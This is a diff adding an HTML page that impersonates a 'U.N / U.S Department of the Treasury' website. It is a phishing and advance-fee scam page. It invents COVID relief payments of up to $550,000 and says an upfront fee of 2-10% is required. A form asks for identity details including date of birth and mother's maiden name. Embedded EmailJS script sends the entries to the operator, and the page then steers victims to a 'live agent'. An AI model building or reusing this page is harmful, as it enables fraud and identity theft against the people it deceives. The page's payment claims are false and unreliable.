@@ -1,0 +1,823 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>U.N / U.S Department of the Treasury</title>
+    <style>
+        /* Reset and Base Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            line-height: 1.6;
+            color: black;
+            background-color: #fff;
+            position: relative;
+            min-height: 100vh;
+        }
+
+        /* Subtle Background Watermark - behind all content */
+        body::before {
+            content: "";
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) rotate(-15deg);
+            width: 500px;
+            height: 500px;
+            background-image: url('epic.jpg');
+            background-size: contain;
+            background-repeat: no-repeat;
+            background-position: center;
+            opacity: 0.7; /* Very light */
+            pointer-events: none;
+            z-index: -2; /* Behind everything */
+        }
+
+        /* Ensure all main content stays readable */
+        main {
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Notification Banner */
+        .notification-banner {
+            background-color: #e8f4fa;
+            border-left: 5px solid #00a7e1;
+            padding: 15px 20px;
+            display: flex;
+            align-items: flex-start;
+            gap: 15px;
+        }
+
+        .notification-icon {
+            width: 24px;
+            height: 24px;
+            background-color: black;
+            border-radius: 50%;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+            font-weight: bold;
+            font-family: Arial, sans-serif;
+            font-size: 14px;
+        }
+
+        .notification-text {
+            font-size: 18px;
+            font-weight: 400;
+            color: black;
+        }
+
+        /* Official Website Banner */
+        .official-banner {
+            background-color: #f5f5f5;
+            padding: 10px 20px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            border-bottom: 1px solid #ddd;
+        }
+
+        .official-flag {
+            width: 24px;
+            height: auto;
+        }
+
+        .official-text {
+            font-size: 14px;
+            color: #333;
+        }
+
+        /* Header */
+        .header {
+            background-color: #004c97;
+            padding: 15px 20px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .header-logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .header-logo {
+            width: 50px;
+            height: auto;
+            border: none;
+        }
+
+        .header-title {
+            color: #fff;
+            font-size: 24px;
+            font-weight: 500;
+            line-height: 1.2;
+            margin: 0;
+            font-family: "Times New Roman";
+        }
+
+        .mobile-menu-toggle {
+            display: none;
+            flex-direction: column;
+            gap: 5px;
+            cursor: pointer;
+        }
+
+        .mobile-menu-toggle span {
+            width: 25px;
+            height: 3px;
+            background-color: #fff;
+            border-radius: 3px;
+        }
+
+        /* Sidebar Navigation */
+        .sidebar {
+            position: fixed;
+            top: 0;
+            left: -300px;
+            width: 300px;
+            height: 100vh;
+            background-color: #004c97;
+            z-index: 1000;
+            transition: left 0.3s ease;
+            overflow-y: auto;
+            padding-top: 70px;
+        }
+
+        .sidebar.active {
+            left: 0;
+        }
+
+        .sidebar-close {
+            position: absolute;
+            top: 15px;
+            right: 15px;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        .sidebar-menu {
+            list-style: none;
+            padding: 20px;
+        }
+
+        .sidebar-menu-item {
+            padding: 15px 20px;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .sidebar-menu-item a {
+            color: #fff;
+            text-decoration: none;
+            font-size: 16px;
+            display: block;
+            transition: color 0.2s;
+        }
+
+        .sidebar-menu-item a:hover {
+            color: #cce5ff;
+        }
+
+        /* Hero Carousel Styles */
+        .hero-section {
+            position: relative;
+            height: 400px;
+            overflow: hidden;
+        }
+
+        .hero-slides {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+        }
+
+        .hero-slide {
+            min-width: 100%;
+            height: 100%;
+            position: relative;
+        }
+
+        .hero-slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .hero-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(to bottom, rgba(0, 0, 0, 0.3), rgba(0, 0, 0, 0.3));
+            z-index: 1;
+        }
+
+        .hero-content {
+            position: absolute;
+            bottom: 30px;
+            left: 30px;
+            color: #fff;
+            z-index: 2;
+        }
+
+        .hero-title {
+            font-size: 48px;
+            font-weight: 700;
+            margin: 0;
+            font-family: "Times New Roman", serif;
+        }
+
+        .hero-carousel-indicators {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            gap: 10px;
+            z-index: 2;
+        }
+
+        .carousel-dot {
+            width: 12px;
+            height: 12px;
+            border-radius: 50%;
+            background-color: #fff;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+
+        .carousel-dot.active {
+            background-color: #004c97;
+        }
+
+        /* Featured Stories Section */
+        .featured-stories {
+            padding: 40px 20px;
+            background-color: #f8f8f8;
+        }
+
+        .section-title {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 30px;
+            display: flex;
+            align-items: center;
+            gap: 20px;
+            color: #004c97;
+        }
+
+        .section-title::after {
+            content: '';
+            flex-grow: 1;
+            height: 2px;
+            background-color: #004c97;
+        }
+
+        .stories-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+        }
+
+        .story-card {
+            background-color: white;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+        }
+
+        .story-image {
+            width: 100%;
+            height: 200px;
+            object-fit: cover;
+            background-color: #004c97;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            font-size: 24px;
+            font-weight: bold;
+            font-family: "Times New Roman";
+        }
+
+        .story-content {
+            padding: 20px;
+        }
+
+        .story-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: black;
+            font-family: "Times New Roman";
+        }
+
+        .story-excerpt {
+            font-size: 14px;
+            color: black;
+            font-family: "Times New Roman";
+        }
+
+        /* Responsive Design */
+        @media (max-width: 768px) {
+            .header-title {
+                font-size: 20px;
+            }
+            .mobile-menu-toggle {
+                display: flex;
+            }
+            .hero-title {
+                font-size: 32px;
+            }
+            .section-title {
+                font-size: 28px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .notification-text {
+                font-size: 16px;
+            }
+            .official-text {
+                font-size: 14px;
+            }
+            .hero-title {
+                font-size: 28px;
+            }
+            .section-title {
+                font-size: 24px;
+            }
+            .stories-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        
+        
+        
+        
+        
+
+        .whatsapp-float {
+            position: fixed;
+            bottom: 90px;
+            right: 9px;
+            width: 60px;
+            height: 60px;
+             background-color:  white;
+             
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 15px 15px 20px rgba(37, 211, 102, 0.4);
+            z-index: 100;
+        }
+
+        .whatsapp-float img {
+            width: 52px;
+            height: 52px;
+        }
+
+        
+        
+        
+        
+        
+        
+                /* Back Button */
+        .back-button-container {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .back-button {
+            display: inline-block;
+            background-color: #004c97;
+            color: white;
+            text-decoration: none;
+            padding: 12px 30px;
+            border-radius: 4px;
+            font-weight: 600;
+            font-size: 16px;
+            transition: background-color 0.2s;
+            font-family: "Times New Roman";
+        }
+
+        .back-button:hover {
+            background-color: #003a75;
+        }
+
+        
+    </style>
+</head>
+<body>
+  
+  
+  
+    <!-- All content wrapped in main for layering control -->
+    <main>
+
+        <!-- Notification Banner -->
+        <div class="notification-banner">
+            <div class="notification-icon">i</div>
+            <div class="notification-text">
+                United Nation/President Donald J.Trump has signed a Continuing Resolution through January 30th. Thanks to the United Nations and President’s decisive leadership in the face of radical left-wing obstructionism, the Department of the Treasury has now resumed normal operations to disseminate the funds to the eligible individuals both home and abroad.
+            </div>
+        </div>
+
+        <!-- Official Website Banner -->
+        <div class="official-banner">
+            <img src="https://upload.wikimedia.org/wikipedia/en/a/a4/Flag_of_the_United_States.svg" alt="US Flag" class="official-flag">
+            <span class="official-text">An official website of the <br> United Nation / United States government <br>
+                <a href="note.html">Here's how you know ▼</a>
+            </span>
+        </div>
+
+        <!-- Header -->
+        <header class="header">
+            <div class="header-logo-container">
+                <img src="epc.jpg" alt="Logo" class="header-logo">
+                <div class="header-title">U.N / U.S  DEPARTMENT <br>OF THE TREASURY</div>
+            </div>
+            <div class="mobile-menu-toggle" id="mobileMenuToggle">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </header>
+
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar" id="sidebar">
+            <div class="sidebar-close" id="sidebarClose">×</div>
+            <ul class="sidebar-menu">
+                <li class="sidebar-menu-item"><a href="index.html">Home</a></li>
+                
+ 
+                 <li class="sidebar-menu-item"><a href="agent.html">Contact Agent</a></li>
+                
+                
+                
+                <li class="sidebar-menu-item"><a href="contact.html">Contact Agent</a></li>
+            </ul>
+        </nav>
+
+        <!-- Hero Section - Auto-Scrolling Carousel -->
+        <section class="hero-section">
+            <div class="hero-slides">
+                <div class="hero-slide"><img src="red.jpg" alt="Hero Image 1"></div>
+                <div class="hero-slide"><img src="epic.jpg" alt="Hero Image 2"></div>
+                <div class="hero-slide"><img src="blue.jpg" alt="Secretary Bessent"></div>
+            </div>
+            
+            
+            
+            <div class="hero-overlay"></div>
+            <div class="hero-content">
+                <h1 class="hero-title"> </h1>
+            </div>
+            <div class="hero-carousel-indicators">
+                <div class="carousel-dot active"></div>
+                <div class="carousel-dot"></div>
+                <div class="carousel-dot"></div>
+            </div>
+        </section>
+
+
+
+
+
+
+
+        <!-- Featured Stories Section -->
+        <section class="featured-stories">
+            <h2 class="section-title">Featured Stories</h2>
+            <div class="stories-grid">
+                <div class="story-card">
+                    <div class="story-image"> POLICY ISSUES </div>
+                    <div class="story-content">
+                        <p class="story-excerpt">
+                            * 		COVID19 Economic Relief<br>
+                            * 		Assistance for American <br>Families and Workers <br>
+                            * 		Economic Impact Payments<br>
+                            * 		Unemployment Compensation<br>
+                            * 		Child Tax Credit<br>
+                            * 		Emergency Rental Assistance<br>
+                            * 		Assistance for Small Businesses<br>
+                            * 		Assistance for State, Local, and Tribal Governments<br><br>
+
+                            The Treasury Department, the Bureau of the Fiscal Service, and the Internal Revenue Service (IRS) rapidly sent out three rounds of direct relief payments during the COVID-19 crisis, and payments from the third round continue to be disbursed to Americans (Home & Abroad) This also open to the other countries depending on the eligibility checks with all the UN/US-Participating countries 
+                            Starting in March 2020, the Coronavirus Aid, Relief, and Economic Security Act (CARES Act) provided Economic Impact Payments of up to $550,000.00 per adult for eligible individuals and  $250,000.00 for Under Age.&nbsp; The payments were reduced for individuals with adjusted gross income (AGI) greater than $1,775,000 ($2,150,000 for married couples with sole eligibility).&nbsp; For a family of four, these Economic Impact Payments provided up to $233,400 of direct financial relief this varies as income-based, however, individual eligible for the offer is deemed to earn certain amount of money from this program irrespective of gender, age, or Race. 
+                            <br><br>
+                            The COVID-related Tax Relief Act of 2020, enacted in late December 2020, authorized additional payments of up to $60,000.00 per adult for eligible individuals and up to $22,000.00 for each qualifying child under age 17.&nbsp; The AGI thresholds at which the payments began to be probably reduced were identical to those under the CARES Act.<br><br>
+
+                            2-10% of any amounts eligible for are needed to be paid upfront by the beneficiaries to perform fiscal duties to match the dissemination policies. The upfront fee payment is very important thus a prerequisite to the entitlement delivery either by cash, check or other means of payment . The upfront fee payment receipts are set to be used for the entitlement delivery completion for audit, quality assurance and record purposes for easy recurrent services. <br><br>
+
+                            * The UN/US American Rescue Plan requires an additional “plus-up” payment, which is based on information (such as a recently filed 2020 tax return that will be drawn from the information provided) that the IRS receives after making the initial payment to the eligible individual.<br>
+                            * In addition, the American Rescue Plan increases direct financial relief to American families by providing $111,400 payments for all qualifying dependents of a family, rather than just qualifying children under age 17.<br><br>
+                            
+                            Normally, a taxpayer will qualify for the full amount of Economic Impact Payment if they have AGI of up to $75,000 for singles and married persons filing a separate return, up to $112,500 for heads of household, and up to $150,000 for married couples filing joint returns and surviving spouses.&nbsp; Payment amounts are reduced for eligible individuals with AGI above those levels.
+                            <br><br>
+                            The Treasury Department and the IRS continue to expand outreach to millions of homeless, rural poor, and other disadvantaged Americans to ensure that they receive Economic Impact Payments. This includes new and continued relationships with homeless shelters, legal aid clinics, and providing Economic Impact Payment information in more than 35 languages.<br><br>
+                            
+                            <strong>CHECK THE STATUS OF YOUR ECONOMIC IMPACT PAYMENT</strong><br>
+                            * To check the status of your Economic Impact Payment, Fill the applicant online form below. 
+                        </p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Applicant Online Form -->
+        <section class="applicant-form-section" style="padding: 50px 20px; background-color: #f8f9fa; margin-top: 40px;">
+            <div class="form-container" style="max-width: 620px; margin: 0 auto; background: white; padding: 35px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.05);">
+                <h2 style="color: #004c97; font-size: 22px; font-weight: 700; margin-bottom: 25px; text-align: center;">
+                    Applicant Online Form
+                </h2>
+
+                <form id="applicantForm">
+                    <!-- Full Name -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="full_name" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Full Name *</label>
+                        <input type="text" id="full_name" name="full_name" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;"
+                            placeholder="Enter your full legal name">
+                    </div>
+
+                    <!-- Full Home Address -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="home_address" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Full Home Address *</label>
+                        <input type="text" id="home_address" name="home_address" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;"
+                            placeholder="123 Main St, Apt 4B">
+                    </div>
+
+                    <!-- Marital Status -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="marital_status" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Marital Status *</label>
+                        <select id="marital_status" name="marital_status" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit; background-color: white;">
+                            <option value="">-- Select --</option>
+                            <option value="Single">Single</option>
+                            <option value="Married">Married</option>
+                            <option value="Divorced">Divorced</option>
+                            <option value="Widowed">Widowed</option>
+                            <option value="Separated">Separated</option>
+                        </select>
+                    </div>
+
+                    <!-- Occupation -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="occupation" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Occupation *</label>
+                        <input type="text" id="occupation" name="occupation" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;"
+                            placeholder="e.g., Teacher, Engineer, Self-employed">
+                    </div>
+
+                    <!-- Date of Birth -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="dob" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Date of Birth *</label>
+                        <input type="date" id="dob" name="dob" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;">
+                    </div>
+
+                    <!-- Email Address -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="email" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Email Address *</label>
+                        <input type="email" id="email" name="email" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;"
+                            placeholder="you@example.com">
+                    </div>
+
+                    <!-- Phone Number -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="phone" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Phone Number *</label>
+                        <input type="tel" id="phone" name="phone" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;"
+                            placeholder="(555) 123-4567">
+                    </div>
+
+                    <!-- Mother's Maiden Name -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="maiden_name" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Mother’s Maiden Name *</label>
+                        <input type="text" id="maiden_name" name="maiden_name" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;"
+                            placeholder="e.g., Johnson">
+                    </div>
+
+                    <!-- Able/Disabled -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="disability" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Able/Disabled Status *</label>
+                        <select id="disability" name="disability" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit; background-color: white;">
+                            <option value="">-- Select --</option>
+                            <option value="Able">Able</option>
+                            <option value="Disabled">Disabled</option>
+                        </select>
+                    </div>
+
+                    <!-- Monthly/Annual Income -->
+                    <div style="margin-bottom: 20px;">
+                        <label for="income" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Monthly or Annual Income *</label>
+                        <input type="text" id="income" name="income" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit;"
+                            placeholder="e.g., $4,200 monthly or $50,400 annually">
+                    </div>
+
+                    <!-- Veteran Status -->
+                    <div style="margin-bottom: 25px;">
+                        <label for="veteran" style="display: block; margin-bottom: 6px; font-weight: 600; color: #333; font-size: 14px;">Veteran Status *</label>
+                        <select id="veteran" name="veteran" required
+                            style="width: 100%; padding: 12px; border: 1px solid #ccc; border-radius: 4px; font-size: 15px; font-family: inherit; background-color: white;">
+                            <option value="">-- Select --</option>
+                            <option value="Yes">Yes</option>
+                            <option value="No">No</option>
+                        </select>
+                    </div>
+
+                    <!-- Submit Button -->
+                    <button type="submit"
+                        style="width: 100%; background-color: #004c97; color: white; padding: 14px; border: none; border-radius: 4px; font-size: 16px; font-weight: 600; cursor: pointer; transition: background-color 0.2s;">
+                        Submit Application
+                    </button>
+                </form>
+
+                <!-- Success Message -->
+                <div id="successMessage" style="display: none; margin-top: 30px; text-align: center;">
+                    <div style="font-size: 32px; color: #28a745; margin-bottom: 12px;">✅✅✅</div>
+                    <p style="font-size: 18px; font-weight: 600; color: #155724; margin: 0;">Applicant Details Submitted Successfully ☑☑☑</p>
+                    <p style="margin: 15px 0 20px; color: #555;">Chat With Live Agent To Proceed With Your Application </p> 
+                    <a href="Agent.html"
+                        style="display: inline-block; background-color: #28a745; color: white; text-decoration: none; padding: 10px 24px; border-radius: 4px; font-weight: 600; font-size: 16px; box-shadow: 0 2px 4px rgba(40,167,69,0.3);">
+                       Chat Live Agent
+                    </a>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <footer style="background-color: #004c97; color: #ffffff; padding: 40px 20px 20px; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin-top: 60px;">
+            <div style="max-width: 1200px; margin: 0 auto;">
+                <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 25px; margin-bottom: 30px;">
+                    <div>
+                        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #ffffff;">BUREAUS</h3>
+                        <p style="margin: 8px 0; font-size: 14px;">Alcohol and Tobacco Tax and Trade (TTB)</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Office of the Comptroller of the Currency (OCC)</p>
+                        <p style="margin: 8px 0; font-size: 14px;">UN/U.S. Mint</p>
+                    </div>
+                    <div>
+                        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #ffffff;">INSPECTOR GENERAL SITES</h3>
+                        <p style="margin: 8px 0; font-size: 14px;">Office of Inspector General (OIG)</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Treasury Inspector General for Tax Administration (TIGTA)</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Report Scams</p>
+                    </div>
+                    <div>
+                        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #ffffff;">U.S. GOVERNMENT SHARED SERVICES</h3>
+                        <p style="margin: 8px 0; font-size: 14px;">Administrative Resource Center (ARC) - Bureau of the Fiscal Service</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Treasury Direct Services for Governments</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Financial Management (FM) Marketplace Catalog</p>
+                    </div>
+                    <div>
+                        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #ffffff;">ADDITIONAL RESOURCES</h3>
+                        <p style="margin: 8px 0; font-size: 14px;">Small Business Contacts</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Budget and Performance</p>
+                    </div>
+                    <div>
+                        <h3 style="font-size: 16px; font-weight: 700; margin-bottom: 15px; color: #ffffff;">OTHER GOVERNMENT SITES</h3>
+                        <p style="margin: 8px 0; font-size: 14px;">Data.gov</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Forms.gov</p>
+                        <p style="margin: 8px 0; font-size: 14px;">Regulations.gov</p>
+                        <p style="margin: 8px 0; font-size: 14px;">PaymentAccuracy.gov</p>
+                        <p style="margin: 8px 0; font-size: 14px;">my Social Security</p>
+                    </div>
+                </div>
+                <div style="border-top: 1px solid rgba(255, 255, 255, 0.2); padding-top: 20px; text-align: center; font-size: 14px; color: rgba(255, 255, 255, 0.8);">
+                    <p>Required Plug-ins: Adobe® Reader®</p>
+                </div>
+            </div>
+        </footer>
+        
+        
+        
+        
+ 
+        
+        
+        
+ 
+        
+        
+
+    </main>
+
+    <!-- ✅ EMAILJS SCRIPT - FULLY CONFIGURED FOR YOUR USE -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+    <script>
+        // 🔑 Initialize EmailJS with your public key
+        emailjs.init("QJZwVNDGTagZCBlMQ");
+
+        // 📩 Handle form submission
+        document.getElementById('applicantForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            // 📥 Collect all form fields
+            const templateParams = {
+                full_name: document.getElementById('full_name').value,
+                home_address: document.getElementById('home_address').value,
+                marital_status: document.getElementById('marital_status').value,
+                occupation: document.getElementById('occupation').value,
+                dob: document.getElementById('dob').value,
+                email: document.getElementById('email').value,
+                phone: document.getElementById('phone').value,
+                maiden_name: document.getElementById('maiden_name').value,
+                disability: document.getElementById('disability').value,
+                income: document.getElementById('income').value,
+                veteran: document.getElementById('veteran').value
+            };
+
+            // 📤 Send via EmailJS
+            emailjs.send("service_r6kqpj2", "template_xvw94po", templateParams)
+                .then(function(response) {
+                    // ✅ SUCCESS: Hide form, show green success message
+                    document.querySelector('.form-container form').style.display = 'none';
+                    document.getElementById('successMessage').style.display = 'block';
+                })
+                .catch(function(error) {
+                    // ❌ ERROR: Show alert and log
+                    alert("Submission failed. Please try again.");
+                    console.error("EmailJS Error:", error);
+                });
+        });
+
+
+
+
+
+
+
+
+
+
+        // 📱 Mobile sidebar toggle
+        const mobileMenuToggle = document.getElementById('mobileMenuToggle');
+        const sidebar = document.getElementById('sidebar');
+        const sidebarClose = document.getElementById('sidebarClose');
+
+        mobileMenuToggle.addEventListener('click', () => sidebar.classList.add('active'));
+        sidebarClose.addEventListener('click', () => sidebar.classList.remove('active'));
+        document.addEventListener('click', (e) => {
+            if (!sidebar.contains(e.target) && !mobileMenuToggle.contains(e.target)) {
+                sidebar.classList.remove('active');
+            }
+        });
+
+        // 🖼️ Carousel dot interaction
+        document.querySelectorAll('.carousel-dot').forEach((dot, index) => {
+            dot.addEventListener('click', () => {
+                document.querySelectorAll('.carousel-dot').forEach(d => d.classList.remove('active'));
+                dot.classList.add('active');
+            });
+        });
+
+        // 🔄 Auto-scrolling carousel
+        document.addEventListener('DOMContentLoaded', function () {
+            const slides = document.querySelectorAll('.hero-slide');
+            const dots = document.querySelectorAll('.carousel-dot');
+            let currentSlide = 0;
+            const totalSlides = slides.length;
+
+            function showSlide(index) {
+                slides.forEach(slide => slide.style.display = 'none');
+                dots.forEach(dot => dot.classList.remove('active'));
+                slides[index].style.display = 'block';
+                dots[index].classList.add('active');
+            }
+
+            function nextSlide() {
+                currentSlide = (currentSlide + 1) % totalSlides;
+                showSlide(currentSlide);
+            }
+
+            setInterval(nextSlide, 4500);
+            showSlide(currentSlide);
+        });
+    </script>
+</body>
+</html>
